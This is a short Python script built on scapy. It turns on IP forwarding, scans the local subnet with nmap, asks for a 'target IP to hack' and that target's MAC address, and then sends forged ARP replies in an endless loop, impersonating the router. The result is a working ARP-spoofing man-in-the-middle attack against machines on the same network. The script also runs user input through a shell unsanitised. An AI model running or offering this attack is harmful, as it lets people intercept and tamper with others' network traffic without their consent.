#!/usr/bin/env python
#thanks to ammar ahmad
from scapy.all import *
from subprocess import call,run
import time
print ("run as root")
b = run('sudo echo 1 > /proc/sys/net/ipv4/ip_forward', capture_output=True, shell=True, text=True)
ip=input("enter ur gateway ip ending as 0 eg 10.5.2.1 = 10.5.2.0:")
cmd=('nmap -sP '+ip+'/24 ')
b = run(cmd, capture_output=True, shell=True, text=True)
print(b.stdout,b.stderr)
op=1 
victim=input('Enter the target IP to hack: ') 
victim=victim.replace(" ","")

spoof=input('Enter the routers IP *SHOULD BE ON SAME ROUTER*: ') 
spoof=spoof.replace(" ","")

mac=input('Enter the target MAC to hack: ') 
mac=mac.replace("-",":")
mac=mac.replace(" ","")

arp=ARP(op=op,psrc=spoof,pdst=victim,hwdst=mac)

while 1:
	send(arp)
	

